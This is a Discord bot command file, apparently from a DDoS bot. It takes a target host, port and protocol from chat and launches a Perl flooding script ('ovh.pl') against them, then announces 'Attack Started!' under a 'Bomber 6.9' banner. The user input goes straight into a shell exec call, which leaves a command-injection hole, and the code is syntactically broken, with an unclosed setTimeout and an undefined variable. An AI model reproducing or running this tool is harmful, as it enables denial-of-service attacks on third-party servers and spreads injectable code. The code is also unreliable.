const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Error')
	.setDescription("`Error`")
	message.channel.send(embed1);
	return;
	}


if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi Cổng`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi phiên bản BOT`")
	message.channel.send(embed1);
	return;
	}
	
	
  
var exec = require('child_process').exec
exec(`perl ovh.pl ${host} ${port} 950 ${protocol}`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack Started By: ' +  message.guild.id)



const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 Bomber 6.9 🔥')
	.setTimestamp()
	.setDescription("`Attack Started!`")
	.setFooter('shit ddoser', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['p3'],
  permLevel: 0
}

exports.help = {
  name: 'p3',
  description: 'Özel',
  usage: 'p3'
}